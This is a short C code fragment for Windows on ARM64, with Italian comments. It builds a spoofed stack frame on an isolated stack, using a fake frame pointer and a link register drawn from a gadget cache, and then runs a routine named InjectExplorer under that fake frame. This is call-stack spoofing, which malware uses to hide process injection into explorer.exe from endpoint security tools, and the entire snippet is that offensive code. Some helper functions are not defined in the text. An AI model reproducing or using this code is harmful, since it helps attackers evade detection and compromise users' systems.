typedef struct _FAKE_FRAME_DATA {
    void   *fakeFp;        // Spoofed frame pointer (x29)
    void   *fakeLr;        // Spoofed link register (x30)
    void   *fakeSp;        // Top of isolated stack
    DWORD64 reserved[5];
} FAKE_FRAME_DATA;

// Alloca 64 KB di stack isolato (PAGE_READWRITE: non eseguibile)
void *fakeStackBase = VirtualAlloc(NULL, DEFAULT_STACK_SIZE,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + DEFAULT_STACK_SIZE);

FAKE_FRAME_DATA fakeFrame = {
    .fakeFp = (void *)((ULONG_PTR)fakeStackTop - 0x100), // 256 B sotto il top: spazio per il frame falso
    .fakeLr = GetRandomGadget(&g_gadgetCache),
    .fakeSp = fakeStackTop
};

DWORD64 result = ExecuteWithFakeFrame(InjectExplorer, &fakeFrame, NULL);

VirtualFree(fakeStackBase, 0, MEM_RELEASE);
